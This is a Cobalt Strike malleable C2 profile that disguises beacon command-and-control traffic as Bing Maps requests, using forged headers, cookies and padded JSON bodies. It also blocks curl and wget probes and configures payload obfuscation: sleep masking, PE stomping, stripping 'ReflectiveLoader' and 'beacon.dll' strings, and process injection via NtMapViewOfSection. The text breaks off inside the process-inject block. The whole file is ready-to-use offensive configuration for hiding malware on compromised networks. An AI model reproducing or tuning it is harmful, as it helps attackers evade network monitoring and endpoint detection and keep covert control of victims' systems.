#bing maps profile
#xx0hcd

###Global Options###
set sample_name "bing_maps.profile";

set sleeptime "38500";
set jitter    "27";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
set data_jitter "50";

set host_stage "false";

###DNS options###
dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "8.8.8.8";
    set dns_max_txt          "220";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   ".wwwds.";
    set dns_stager_subhost   ".e2867.dsca.";
     
    # DNS subhost override options added in 4.3:
    set beacon               "d-bx.";
    set get_A                "d-1ax.";
    set get_AAAA             "d-4ax.";
    set get_TXT              "d-1tx.";
    set put_metadata         "d-1mx";
    set put_output           "d-1ox.";
    set ns_response          "zero";
}

###SMB options###
set pipename "ntsvcs##";
set pipename_stager "scerpc##";
set smb_frame_header "";

###TCP options###
set tcp_port "8000";
set tcp_frame_header "";

###SSH BANNER###
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "SearchTextHarvester##";

###SSL Options###
#https-certificate {
#    set keystore "domain001.store";
#    set password "password123";
#}

#code-signer {
    #set keystore "your_keystore.jks";
    #set password "your_password";
    #set alias "server";
#}

###HTTP-Config Block###
http-config {
#    set headers "Server, Content-Type";
#    header "Content-Type" "text/html;charset=UTF-8";
#    header "Server" "nginx";
#
    set trust_x_forwarded_for "false";
    
    set block_useragents "curl*,lynx*,wget*";
}

#set headers_remove "image/x-xbitmap, image/pjpeg, application/vnd";

###HTTP-GET Block###
http-get {

    set uri "/maps/overlaybfpr";
    
    client {

        header "Host" "www.bing.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Connection" "close";

	   
    metadata {
        base64;
	
	prepend "_SS=";
	prepend "SRCHD=AF=NOFORM;";
        header "Cookie";

    }

	parameter "q" "san%20diego%20ca%20zoo";

    }

    server {
    
        header "Cache-Control" "public";
        header "Content-Type" "text/html;charset=utf-8";
        header "Vary" "Accept-Encoding";
        header "P3P" "\"NON UNI COM NAV STA LOC CURa DEVa PSAa PSDa OUR IND\"";
        header "X-MSEdge-Ref" "Ref A: 20D7023F4A1946FEA6E17C00CC8216CF Ref B: DALEDGE0715";
        header "Connection" "close";
 
        output {

            base64;
            
            prepend "{
    \"_type\": \"Suggestions\",
    \"instrumentation\": {
        \"pingUrlBase\": \"https://www.bing.com/api/ping?IG=22592B48742E48B7B855897EE3CA6400&CID=34823DAF741A65682A9032BA75E66427&ID=\",
        \"pageLoadPingUrl\": \"https://www.bing.com/api/ping/pageload?IG=22592B48742E48B7B855897EE3CA6400&CID=34823DAF741A65682A9032BA75E66427&Type=Event.CPT&DATA=0\"
    },
    \"queryContext\": {
        \"originalQuery\": \"san diego ca zoo\"
    },
    \"value\": [{
        \"_type\": \"Place\",
        \"id\": \"sid:\"";




           
            append "\"
        \"readLink\": \"https://www.bing.com/api/v6/localentities/dbb1c326-5b67-4591-a264-0929e070e5ee\",
        \"readLinkPingSuffix\": \"DevEx,5018.1\",
        \"entityPresentationInfo\": {
            \"entityScenario\": \"ListItem\",
            \"entitySubTypeHints\": [\"PopulatedPlace\"]
        },
        \"geo\": {
            \"latitude\": 32.7157,
            \"longitude\": -117.162
        },
        \"address\": {
            \"addressLocality\": \"San Diego\",
            \"addressSubregion\": \"San Diego County\",
            \"addressRegion\": \"California\",
            \"addressCountry\": \"United States\",
            \"countryIso\": \"US\",
            \"text\": \"San Diego, California\"
        },
        \"formattingRuleId\": \"US\"
    }, {
        \"_type\": \"LocalBusiness\",
        \"id\": \"local_ypid:\"YN873x13020856635161814\"\",
        \"readLink\": \"https://www.bing.com/api/v6/localbusinesses/YN873x13020856635161814\",
        \"readLinkPingSuffix\": \"DevEx,5019.1\",
        \"name\": \"San Diego Zoo\",
        \"geo\": {
            \"latitude\": 32.7353,
            \"longitude\": -117.149
        },
        \"address\": {
            \"streetAddress\": \"2920 Zoo Dr\",
            \"addressLocality\": \"San Diego\",
            \"addressRegion\": \"CA\",
            \"postalCode\": \"92101\",
            \"addressCountry\": \"United States\",
            \"countryIso\": \"US\",
            \"text\": \"2920 Zoo Dr, San Diego, CA 92101\"
        },
        \"formattingRuleId\": \"US\",
        \"categories\": [\"90000.90001.90012.90017\"]
    }, {
        \"_type\": \"Place\",
        \"id\": \"sid:\"63101d85-2568-910b-fee1-2518175b6a48\"\",
        \"readLink\": \"https://www.bing.com/api/v6/localentities/63101d85-2568-910b-fee1-2518175b6a48\",
        \"readLinkPingSuffix\": \"DevEx,5020.1\",
        \"entityPresentationInfo\": {
            \"entityScenario\": \"ListItem\",
            \"entitySubTypeHints\": [\"PopulatedPlace\"]
        },
        \"geo\": {
            \"latitude\": 10.2573,
            \"longitude\": -67.9548
        },
        \"address\": {
            \"addressLocality\": \"San Diego\",
            \"addressRegion\": \"Carabobo\",
            \"addressCountry\": \"Venezuela\",
            \"countryIso\": \"VE\",
            \"text\": \"San Diego, Carabobo\"
        }";     
	  

            print;
        }
    }
}



###HTTP-Post Block###
http-post {
    
    set uri "/fd/ls/lsp.aspx";
    #set verb "GET";
    set verb "POST";

    client {

	header "Host" "www.bing.com";
	header "Accept" "*/*";
	header "Accept-Language" "en-US";
	header "Content-Type" "text/xml";
	header "Connection" "close";
        
        output {
            base64url;
            
            prepend "SRCHUID=";
            prepend "SRCHD=AF=NOFORM;";
	    header "Cookie";
        }

        id {
	    base64url;
            parameter "lid";

        }
    }

    server {
    
        header "Cache-Control" "public, max-age=31536000";
        header "Content-Type" "application/json";
        header "Vary" "Accept-Encoding";
        header "X-Cache" "TCO_HIT";
        header "Server" "Microsoft-IIS/10.0";
        header "X-AspNet-Version" "4.0.30319";
        header "X-Powered-By" "ASP.NET";

        output {
            netbios;	    
	   
	    prepend "{
    \"categoryMap\": [
        {
            \"categoryId\": 91263,
            \"bucketId\": 1848,
            \"entry\": \"CommunityPoint\"
        },
        {
            \"categoryId\": 90892,
            \"bucketId\": 1899,
            \"entry\": \"Transit\"
        },
        {
            \"categoryId\": 90014,
            \"bucketId\": 300,
            \"entry\": \"ZXlJeE5DSTZleUoyWldOMGIzSkpiV0ZuWlNJNmV5SnlaV052Y21SeklqcGJleUp6WTJGc1pWQmhiR1YwZEdWTFpYbEpaQ0k2TFRFc0luTm9ZWEJsVUdGc1pYUjBaVXRsZVVsa0lqb3RNU3dpWjJWdmJXVjBjbmxUZEhKcGJtY2lPaUpOTWk0Mk56Z3NNVEJvTFRVdU16VTFWall1TlROb0xUTXVNalFnSUdNdE1DNDVPREVzTUM0d01qSXRNUzQzTlMwd0xqTTVOQzB5TGpFNE1TMHhMakE1TW1NdE1DNHpNamN0TUM0MU16TXRNQzQxT0RNdE1TNDBORElzTUM0d056SXRNaTQzTld3d0xqRXpOeTB3TGpJek1Xd3hMalU0T1MweUxqSXlNaUFnWXkwd0xqSTFOUzB3TGpFNE15MHdMalEyTmkwd0xqUXhPQzB3TGpZeE9TMHdMamN3TVdNdE1DNDBOREV0TUM0NE1Ua3RNQzR6TFRFdU56ZzJMREF1TkRFNExUSXVPRGN6YkRFdU5qTTVMVEl1TXpJell5MHdMakF6TXkwd0xqQTBOaTB3TGpBMkxUQXVNRGc1TFRBdU1EZzBMVEF1TVRNZ0lHTXRNQzR5TlMwd0xqUXlNeTB3TGpVM01TMHhMak14TlN3d0xqQTVPUzB5TGpVek4yd3lMamN6T0MwMExqRTVPRU10TVM0M05TMHhNeTR5TnkweExqQXlPQzB4TkN3d0xqQXhPQzB4TkdNd0xqWXdPU3d3TERFdU5EYzRMREF1TWpVMExESXVNVFU0TERFdU5EVTViREl1T0RFM0xEUXVPRGNnSUdNd0xqRXhOU3d3TGpRNE1pd3dMakE1TXl3eExqRTNPUzB3TGpJNE1Td3hMamM1T0d3eExqZzBOU3d5TGpZek0yTXdMalExT1N3d0xqY3pOU3d3TGpjd09Dd3hMamMyTWl3d0xqRTVOU3d5TGpZNE0wTTJMall4Tmkwd0xqTXhNeXcyTGpReE1pMHdMakExTVN3MkxqRXdPU3d3TGpFM01pQWdiREl1TURFekxESXVOemMwUXpndU5EUTFMRE11TlRjeExEZ3VOakU0TERRdU5UUXNPQzR4TWpZc05TNHpOemhqTFRBdU1qUXpMREF1TkRFekxUQXVPRFExTERFdU1URXpMVEl1TVRVc01TNHhOVFJJTWk0Mk56aFdNVEI2SWl3aVptbHNiRlpoYkhWbFNXUWlPakkwTENKemRISnZhMlZXWVd4MVpVbGtJam94TENKemRISnZhMlZYYVdSMGFDSTZNU3dpYzNSeWIydGxVMk5oYkdWUVlXeGxkSFJsUzJWNVNXUWlPaTB4TENKeVpXTnZjbVJVZVhCbElqb2lVR0YwYUNKOQ==\"
        },
        {
            \"categoryId\": 90595,
            \"bucketId\": 311,
            \"entry\": \"RealEstatePoint\"
        },
        {
            \"categoryId\": 91616,
            \"bucketId\": 257,
            \"entry\": \"AquariumPoint\"
        },
        {
            \"categoryId\": 90954,
            \"bucketId\": 277,
            \"entry\": \"ArtGalleryPoint\"
        },
        {
            \"categoryId\": 90001,
            \"bucketId\": 258,
            \"entry\": \"UEhOamNtbHdkQ0IwZVhCbFBTSjBaWGgwTDJwaGRtRnpZM0pwY0hRaUlHTnliM056YjNKcFoybHVQU0poYm05dWVXMXZkWE1pSUhOeVl6MGlMM0p3TDBScWNrUjZOMU5ZYlhOMWRYZHhRMlI1WldsdlFsWXpPWGhKV1M1bmVpNXFjeUkrUEM5elkzSnBjSFErUEhOamNtbHdkQ0IwZVhCbFBTSjBaWGgwTDJwaGRtRnpZM0pwY0hRaVBnPT0=\"
        },
        {
            \"categoryId\": 90133,
            \"bucketId\": 278,
            \"entry\": \"ATMPoint\"
        },
        {
            \"categoryId\": 90078,
            \"bucketId\": 330,
            \"entry\": \"AutomobileRepairPoint\"
        },
        {
            \"categoryId\": 91186,
            \"bucketId\": 327,
            \"entry\": \"FoodPoint\"
        },
        {
            \"categoryId\": 90122,
            \"bucketId\": 279,
            \"entry\": \"BankPoint\"
        },
        {
            \"categoryId\": 90243,
            \"bucketId\": 284,
            \"entry\": \"BarPoint\"
        },
        {
            \"categoryId\": 91204,
            \"bucketId\": 308,
            \"entry\": \"BarAndGrillPoint\"
        },
        {
            \"categoryId\": 91576,
            \"bucketId\": 1851,
            \"entry\": \"AttractionPoint\"
        },
        {
            \"categoryId\": 90353,
            \"bucketId\": 1972,
            \"entry\": \"ZXlKelkyRnNaVkJoYkdWMGRHVkxaWGxKWkNJNkxURXNJbk5vWVhCbFVHRnNaWFIwWlV0bGVVbGtJam90TVN3aVoyVnZiV1YwY25sVGRISnBibWNpT2lKTkxUSXVNalUwTFRZdU16ZzNZekFzTUMweExqZzJPU3d3TGpNd015MHhMakE0T1MweExqRXhPR3d5TGpjME1TMDBMakU1TTJNd0xEQXNNQzQxTkMweExqTXlMREV1TWpnMExEQnNNaTQyTkRNc05DNDBNeUFnWXpBc01Dd3dMakl5TVN3d0xqa3hOQzB4TGpBMk9Dd3dMamc0TVd3eUxqZzVOQ3cwTGpFek1XTXdMREFzTUM0M056TXNNUzR5TlMwd0xqazFNU3d4TGpJMVNETXVNVEUzYkRNdU5EZ3lMRFF1TnpReVl6QXNNQ3d3TGpVME1pd3hMakEwTkMwd0xqWTNOU3d4TGpBNE1rZ3dMamsyTkhZekxqUTJPQ0FnYUMweExqa3lOM1l0TXk0ME4yZ3ROQzQ1TlRSak1Dd3dMVEV1TXpJc01DNHhNamN0TUM0MU56WXRNUzR6TmpGc015NHlNelV0TkM0MU1qWm9MVEV1TlRjM1l6QXNNQzB4TGpJeE55d3dMakUyTlMwd0xqSXpOUzB4TGpNeU0wd3RNaTR5TlRRdE5pNHpPRGNpTENKbWFXeHNWbUZzZFdWSlpDSTZNalVzSW5OMGNtOXJaVlpoYkhWbFNXUWlPakVzSW5OMGNtOXJaVmRwWkhSb0lqb3hMQ0p6ZEhKdmEyVlRZMkZzWlZCaGJHVjBkR1ZMWlhsSlpDSTZMVEVzSW5KbFkyOXlaRlI1Y0dVaU9pSlFZWFJvSW4wPQ==\"
        },
        {
            \"categoryId\": 90940,
            \"bucketId\": 329,
            \"entry\": \"MarinaPoint\"
        },
        {
            \"categoryId\": 90650,
            \"bucketId\": 1365,
            \"entry\": \"BookstorePoint\"
        },
        {
            \"categoryId\": 91533,
            \"bucketId\": 271,
            \"entry\": \"BowlingPoint\"
        },
        {
            \"categoryId\": 91647,
            \"bucketId\": 1382,
            \"entry\": \"ZXlJeU1EWWlPbnNpZG1WamRHOXlTVzFoWjJVaU9uc2ljbVZqYjNKa2N5STZXM3NpYzJOaGJHVlFZV3hsZEhSbFMyVjVTV1FpT2pFNU9Td2ljMmhoY0dWUVlXeGxkSFJsUzJWNVNXUWlPakl3TUN3aVoyVnZiV1YwY25sVGRISnBibWNpT2lKTk1USXVOUzA1YUMweU5TNHhZeTB4TGpjc01DMHpMakVzTVM0MExUTXVNU3d6TGpGV05TNDVZekFzTVM0M0xERXVOQ3d6TGpFc015NHhMRE11TVdneU5TNHhJQ0FnWXpFdU55d3dMRE11TVMweExqUXNNeTR4TFRNdU1WWXROUzQ1UXpFMUxqWXROeTQyTERFMExqSXRPU3d4TWk0MUxUbDZJQ0lzSW1acGJHeFdZV3gxWlVsa0lqb3lNU3dpYzNSeWIydGxWbUZzZFdWSlpDSTZNU3dpYzNSeWIydGxWMmxrZEdnaU9qRXNJbk4wY205clpWTmpZV3hsVUdGc1pYUjBaVXRsZVVsa0lqb3RNU3dpY21WamIzSmtWSGx3WlNJNklsQmhkR2dpZlE9PQ\"
        },
        {
            \"categoryId\": 255,
            \"bucketId\": 254,
            \"entry\": \"Transit\"
        },
        {
            \"categoryId\": 257,
            \"bucketId\": 253,
            \"entry\": \"Transit\"
        },
        {
            \"categoryId\": 264,
            \"bucketId\": 243,
            \"entry\": \"Transit\"
        },
        {
            \"categoryId\": 263,
            \"bucketId\": 241,
            \"entry\":";





	    append " },
        {
            \"categoryId\": 266,
            \"bucketId\": 236,
            \"entry\": \"Transit\"
        },
        {
            \"categoryId\": 251,
            \"bucketId\": 252,
            \"entry\": \"Transit\"
        },
        {
            \"categoryId\": 265,
            \"bucketId\": 242,
            \"entry\": \"Transit\"
        },
        {
            \"categoryId\": 253,
            \"bucketId\": 251,
            \"entry\": \"Transit\"
        },
        {
            \"categoryId\": 254,
            \"bucketId\": 250,
            \"entry\": \"ZXlJek1DSTZleUoyWldOMGIzSkpiV0ZuWlNJNmV5SnlaV052Y21SeklqcGJleUp6WTJGc1pWQmhiR1YwZEdWTFpYbEpaQ0k2TkRJNUxDSnphR0Z3WlZCaGJHVjBkR1ZMWlhsSlpDSTZORE13TENKblpXOXRaWFJ5ZVZOMGNtbHVaeUk2SWsweE15MHdMakF4TkRZeE1ESTVZekFzTWk0eE9UZ3RNU3cwTGpFek1TMHlMalV4TWl3MUxqSTRNVU0zTGpjeU5pdzNMakUzTWpNNUxETXVOelUwTERjdU9UZzFNemtzTUN3M0xqazROVE01Y3kwM0xqY3lOaTB3TGpneE15MHhNQzQwT0RndE1pNDNNVGxETFRFeUxEUXVNVEUyTXprdE1UTXNNaTR4T0RNek9TMHhNeTB3TGpBeE5EWXhNREk1WXpBdE1pNHhPVGNzTVMwMExqRXpNaXd5TGpVeE1pMDFMakk0TVVNdE55NDNNall0Tnk0eU1EQTJNUzB6TGpjMU5DMDRMakF4TkRZeExEQXRPQzR3TVRRMk1YTTNMamN5Tml3d0xqZ3hOQ3d4TUM0ME9EZ3NNaTQzTVRrZ0lFTXhNaTAwTGpFME5qWXhMREV6TFRJdU1qRXhOakVzTVRNdE1DNHdNVFEyTVRBeU9Yb2lMQ0ptYVd4c1ZtRnNkV1ZKWkNJNk5URXNJbk4wY205clpWWmhiSFZsU1dRaU9qVXlMQ0p6ZEhKdmEyVlhhV1IwYUNJNk1Td2ljM1J5YjJ0bFUyTmhiR1ZRWVd4bGRIUmxTMlY1U1dRaU9pMHhMQ0p5WldOdmNtUlVlWEJsSWpvaVVHRjBhQ0o5TEhzaWMyTmhiR1ZRWVd4bGRIUmxTMlY1U1dRaU9qUXpNaXdpYzJoaGNHVlFZV3hsZEhSbFMyVjVTV1FpT2pRek15d2liR1ZtZEZSdmNDSTZleUo0SWpvdE9TNHpOekF4TENKNUlqb3RPQzR3T0RNd01EaDlMQ0p5YVdkb2RFSnZkSFJ2YlNJNmV5SjRJam94TUM0ek56QXhNeXdpZVNJNk9DNHdPRE13TURoOUxDSjBaWGgwVTNSNWJHVWlPbnNpWm05dWRFWmhiV2xzZVVsa0lqbzRMQ0ptYjI1MFUybDZaU0k2T1N3aWJXbHVhVzExYlVadmJuUlRhWHBsSWpvNUxDSm9aV2xuYUhSTllYUmphRTF2WkdVaU9qQXNJbWhsYVdkb2RFMWhkR05vVUdsNFpXeHpJam93TENKbWIyNTBVM1I1YkdVaU9qQXNJblJsZUhSRWNtRjNVMlYwZEdsdVozTWlPakFzSW1OdmJHOXlWbUZzZFdWSlpDSTZOVE1zSW1kc2IzZFRhWHBsSWpvekxDSnpaV052Ym1SSGJHOTNVMmw2WlNJNk9Td2lZV3h3YUdGR2JHOXZjaUk2TVRjMUxDSm5iRzkzUTI5c2IzSldZV3gxWlVsa0lqbzNMQ0p2ZFhSc2FXNWxRMjlzYjNKV1lXeDFaVWxrSWpvM0xDSnZkWFJzYVc1bFYybGtkR2dpT2pCOUxDSnpkSEpwYm1kVGIzVnlZMlZKWkNJNk5ETTBMQ0p6ZEhKcGJtZFRiM1Z5WTJWVWVYQmxJam95TENKb2IzSnBlbTl1ZEdGc1FXeHBaMjV0Wlc1MElqb3dMQ0oyWlhKMGFXTmhiRUZzYVdkdWJXVnVkQ0k2TUN3aWFHOXlhWHB2Ym5SaGJFRjFkRzlUWTJGc2FXNW5Jam94TENKMlpYSjBhV05oYkVGMWRHOVRZMkZzYVc1bklqb3hMQ0p5WldOdmNtUlVlWEJsSWpvaVZHVjRkQ0o5WFgxOWZRPT0=\"
        },
        {
            \"categoryId\": 260,
            \"bucketId\": 229,
            \"entry\": \"Transit\"
        },
        {
            \"categoryId\": 267,
            \"bucketId\": 226,
            \"entry\": \"Transit\"
        },
        {
            \"categoryId\": 252,
            \"bucketId\": 249,
            \"entry\": \"Transit\"
        },
        {
            \"categoryId\": 91714,
            \"bucketId\": 66,
            \"entry\": \"FinancialPoint\"
        },
        {
            \"categoryId\": 203,
            \"bucketId\": 248,
            \"entry\": \"ZXlJek16TWlPbnNpZG1WamRHOXlTVzFoWjJVaU9uc2ljbVZqYjNKa2N5STZXM3NpYzJOaGJHVlFZV3hsZEhSbFMyVjVTV1FpT2pFNU9Td2ljMmhoY0dWUVlXeGxkSFJsUzJWNVNXUWlPakl3TUN3aVoyVnZiV1YwY25sVGRISnBibWNpT2lKTk5TNDVMVGxJTFRVdU9VTXROeTQyTFRrdE9TMDNMall0T1MwMUxqbFdOUzQ1UXkwNUxEY3VOaTAzTGpZc09TMDFMamtzT1VnMUxqbEROeTQyTERrc09TdzNMallzT1N3MUxqbFdMVFV1T1NBZ0lFTTVMVGN1Tml3M0xqWXRPU3cxTGprdE9VdzFMamt0T1hvZ0lpd2labWxzYkZaaGJIVmxTV1FpT2pJeExDSnpkSEp2YTJWV1lXeDFaVWxrSWpveExDSnpkSEp2YTJWWGFXUjBhQ0k2TVN3aWMzUnliMnRsVTJOaGJHVlFZV3hsZEhSbFMyVjVTV1FpT2kweExDSnlaV052Y21SVWVYQmxJam9pVUdGMGFDSjlMSHNpYzJOaGJHVlFZV3hsZEhSbFMyVjVTV1FpT2pJd01pd2ljMmhoY0dWUVlXeGxkSFJsUzJWNVNXUWlPakl3TUN3aVoyVnZiV1YwY25sVGRISnBibWNpT2lKTkxUY3VOeXcxTGpsak1Dd3hMREF1T0N3eExqZ3NNUzQ0TERFdU9FZzFMamxqTVN3d0xERXVPQzB3TGpnc01TNDRMVEV1T0ZZdE5TNDVZekF0TVMwd0xqZ3RNUzQ0TFRFdU9DMHhMamhJTFRVdU9TQWdJQ0JqTFRFc01DMHhMamdzTUM0NExURXVPQ3d4TGpoV05TNDVlaUFnSWl3aVptbHNiRlpoYkhWbFNXUWlPakl5TENKemRISnZhMlZXWVd4MVpVbGtJam94TENKemRISnZhMlZYYVdSMGFDSTZNU3dpYzNSeWIydGxVMk5oYkdWUVlXeGxkSFJsUzJWNVNXUWlPaTB4TENKeVpXTnZjbVJVZVhCbElqb2lVR0YwYUNKOUxIc2ljMk5oYkdWUVlXeGxkSFJsUzJWNVNXUWlPakl3TkN3aWMyaGhjR1ZRWVd4bGRIUmxTMlY1U1dRaU9qSXdOU3dpWjJWdmJXVjBjbmxUZEhKcGJtY2lPaUpOTWk0MUxEWXVNMmd5TGpOTU1pNDJMRE11Tm1Nd0xqWXRNQzR4TERFdE1DNHpMREV0TUM0NFl6QXNNQ3d3TFRJdU1Td3dMakV0TXk0Mll6QXVNUzB4TGpjc01DMHlMaklzTUMweUxqSkRNeTQzTFRNdU55d3pMakl0TkM0eUxESXVOQzAwTGpJZ0lDQm9MVEoyTFRFdU1XZ3lMakYyTFRBdU9XZ3ROUzR6ZGpBdU9XZ3lMakYyTVM0eGFDMHhMamxqTFRBdU9Dd3dMVEV1TWl3d0xqVXRNUzQwTERFdU1tTXdMREFzTUN3d0xqY3NNQ3d5TGpKak1DNHhMREV1Tml3d0xqRXNNeTQxTERBdU1Td3pMalZqTUN3d0xqWXNNQzQxTERBdU9Td3hMakVzTUM0NUlDQWdiQzB5TGpJc01pNDJhREl1TTJ3eExqUXRNaTQyYURJdU1rd3lMalVzTmk0emVpQk5NaTQxTERJdU1XTXdMREF1TkMwd0xqTXNNQzQzTFRBdU55d3dMamRETVM0MExESXVPQ3d4TERJdU5Dd3hMREl1TVhNd0xqTXRNQzQzTERBdU55MHdMamRETWk0eExERXVNeXd5TGpVc01TNDNMREl1TlN3eUxqRjZJQ0FnSUUwdE1pNDBMVEl1TldNd0xUQXVNaXd3TGpJdE1DNDBMREF1TkMwd0xqUm9OR013TGpJc01Dd3dMalFzTUM0eUxEQXVOQ3d3TGpSMk15NHhhQzAwTGpoRExUSXVOQ3d3TGpZdE1pNDBMVEl1TlMweUxqUXRNaTQxZWlCTkxURXVOeXd4TGpORExURXVNeXd4TGpNdE1Td3hMamN0TVN3eUxqRWdJQ0J6TFRBdU15d3dMamN0TUM0M0xEQXVOMk10TUM0MExEQXRNQzQzTFRBdU15MHdMamN0TUM0M1F5MHlMalVzTVM0M0xUSXVNU3d4TGpNdE1TNDNMREV1TTNvZ0lpd2labWxzYkZaaGJIVmxTV1FpT2pJekxDSnpkSEp2YTJWV1lXeDFaVWxrSWpveExDSnpkSEp2YTJWWGFXUjBhQ0k2TVN3aWMzUnliMnRsVTJOaGJHVlFZV3hsZEhSbFMyVjVTV1FpT2kweExDSnlaV052Y21SVWVYQmxJam9pVUdGMGFDSjlYWDE5ZlE9PQ==\"
        },
        {
            \"categoryId\": 91754,
            \"bucketId\": 65,
            \"entry\": \"Transit\"
        },
        {
            \"categoryId\": 205,
            \"bucketId\": 247,
            \"entry\": \"Transit\"
        },
        {
            \"categoryId\": 91649,
            \"bucketId\": 281,
            \"entry\": \"CafePoint\"
        },
        {
            \"categoryId\": 91562,
            \"bucketId\": 1366,
            \"entry\": \"CampPoint\"
        },
        {
            \"categoryId\": 90977,
            \"bucketId\": 331,
            \"entry\": \"\"
        },
        {
            \"categoryId\": 90903,
            \"bucketId\": 274,
            \"entry\": \"AutomobileRentalPoint\"
        },
        {
            \"categoryId\": 90024,
            \"bucketId\": 303,
            \"entry\": \"CasinoPoint\"
        },
        {
            \"categoryId\": 91622,
            \"bucketId\": 1839,
            \"entry\": \"AttractionPoint\"
        },
        {
            \"categoryId\": 91252,
            \"bucketId\": 1846,
            \"entry\": \"PalacePoint\"
        },
        {
            \"categoryId\": 90619,
            \"bucketId\": 1847,
            \"entry\": \"ZXlJek5qTWlPbnNpZG1WamRHOXlTVzFoWjJVaU9uc2ljbVZqYjNKa2N5STZXM3NpYzJOaGJHVlFZV3hsZEhSbFMyVjVTV1FpT2pFek5EZ3NJbk5vWVhCbFVHRnNaWFIwWlV0bGVVbGtJam94TXpRNUxDSmpXQ0k2TUN3aVkxa2lPakFzSW5KWUlqb3dMQ0p5V1NJNk1Dd2lZMjlzYjNKV1lXeDFaVWxrSWpveU56Y3NJbXh2WTJ0WFNGSmhkR2x2SWpwMGNuVmxMQ0p5WldOdmNtUlVlWEJsSWpvaVJtbHNiR1ZrUld4c2FYQnpaU0o5TEhzaWMyTmhiR1ZRWVd4bGRIUmxTMlY1U1dRaU9qRXpORGdzSW5Ob1lYQmxVR0ZzWlhSMFpVdGxlVWxrSWpveE16UTVMQ0pqV0NJNk1Dd2lZMWtpT2pBc0luSllJam93TENKeVdTSTZNQ3dpYkdsdVpWTjBlV3hsSWpwN0ltTnZiRzl5Vm1Gc2RXVkpaQ0k2TWpjNExDSnpkSEp2YTJWWGFXUjBhQ0k2TVN3aVpHRnphR1Z6VEdsemRDSTZXMTBzSW1OdmJYQnZkVzVrUVhKeVlYbE1hWE4wSWpwYlhYMHNJbXh2WTJ0WFNGSmhkR2x2SWpwMGNuVmxMQ0p6ZEhKdmEyVlRZMkZzWlZCaGJHVjBkR1ZMWlhsSlpDSTZNVE0xTVN3aWNtVmpiM0prVkhsd1pTSTZJa1ZzYkdsd2MyVWlmU3g3SW5OallXeGxVR0ZzWlhSMFpVdGxlVWxrSWpveE16VXpMQ0p6YUdGd1pWQmhiR1YwZEdWTFpYbEpaQ0k2TVRNMU5Dd2laMlZ2YldWMGNubFRkSEpwYm1jaU9pSk5OQzQwTFRNdU5tTXdMakl0TUM0eUxEQXVNaTB3TGpVc01DMHdMamRqTFRBdU1pMHdMakl0TUM0MUxUQXVNaTB3TGpjc01Fd3dMamd0TVM0MWFERXVORU15TGpJdE1TNDFMRFF1TkMwekxqWXNOQzQwTFRNdU5ub2dUVFF0TUM0MWFDMDRJQ0JqTFRBdU15d3dMVEF1TlN3d0xqSXRNQzQxTERBdU5XTXdMREl1TlN3eUxEUXVOU3cwTGpVc05DNDFjelF1TlMweUxEUXVOUzAwTGpWRE5DNDFMVEF1TXl3MExqTXRNQzQxTERRdE1DNDFlaUJOTVN3eUxqVklNQzQxVmpOak1Dd3dMak10TUM0eUxEQXVOUzB3TGpVc01DNDFJQ0JUTFRBdU5Td3pMak10TUM0MUxETldNaTQxU0MweFl5MHdMak1zTUMwd0xqVXRNQzR5TFRBdU5TMHdMalZUTFRFdU15d3hMalV0TVN3eExqVm9NQzQxVmpGak1DMHdMak1zTUM0eUxUQXVOU3d3TGpVdE1DNDFVekF1TlN3d0xqY3NNQzQxTERGMk1DNDFTREVnSUdNd0xqTXNNQ3d3TGpVc01DNHlMREF1TlN3d0xqVlRNUzR6TERJdU5Td3hMREl1TlhvaUxDSm1hV3hzVm1Gc2RXVkpaQ0k2TWpjNUxDSnpkSEp2YTJWV1lXeDFaVWxrSWpveExDSnpkSEp2YTJWWGFXUjBhQ0k2TVN3aWMzUnliMnRsVTJOaGJHVlFZV3hsZEhSbFMyVjVTV1FpT2kweExDSnlaV052Y21SVWVYQmxJam9pVUdGMGFDSjlYWDE5ZlE9PQ===\"
        },
        {
            \"categoryId\": 91703,
            \"bucketId\": 1849,
            \"entry\": \"CommunityPoint\"
        },
        {
            \"categoryId\": 90386,
            \"bucketId\": 1367,
            \"entry\": \"ClinicPoint\"
        },
        {
            \"categoryId\": 90188,
            \"bucketId\": 295,
            \"entry\": \"EducationPoint\"
        },
        {
            \"categoryId\": 90584,
            \"bucketId\": 310,
            \"entry\": \"CommunityPoint\"
        }";

            print;
        }
    }
}



###HTTP-Stager Block###
http-stager {
	set uri_x86 "/maps/overlayBFPR";
	set uri_x64 "/maps/overlayBfpr";
    
    client {

        header "Host" "www.bing.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Connection" "close";
    }
    
    server {
    
    	header "Cache-Control" "public";
        header "Content-Type" "text/html;charset=utf-8";
        header "Vary" "Accept-Encoding";
        header "P3P" "\"NON UNI COM NAV STA LOC CURa DEVa PSAa PSDa OUR IND\"";
        header "X-MSEdge-Ref" "Ref A: 20D7023F5A1946FFA6E18C00CC8216CF Ref B: DALEDGE0815";
        header "Connection" "close";
    
    	output {
    	
    		print;
    	}
    }
}


###Malleable PE/Stage Block###
stage {
    set checksum        "0";
    set compile_time    "12 Dec 2019 02:52:11";
    set entry_point     "170000";
    #set image_size_x86 "6586368";
    #set image_size_x64 "6586368";
    #set name	        "WWanMM.dll";
    set userwx 	        "false";
    set cleanup	        "true";
    set sleep_mask	"true";
    set stomppe	        "true";
    set obfuscate	"true";
    set rich_header     "";
    
    set sleep_mask "true";
    
    set smartinject "true";
    
    #set allocator "HeapAlloc";
    set magic_mz_x86 "MZRE";
    set magic_mz_x64 "MZAR";
    set magic_pe "EA";

    set module_x86 "wwanmm.dll";
    set module_x64 "wwanmm.dll";

    transform-x86 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        }

    transform-x64 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        }

    #string "something";
    #data "something";
    #stringw "something"; 
}

###Process Inject Block###
process-inject {

    set allocator "NtMapViewOfSection";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
        
    transform-x86 {
        prepend "\x90\x90\x90";
    }
    transform-x64 {
        prepend "\x90\x90\x90";
    }

    execute {
        #CreateThread;
        #CreateRemoteThread;       
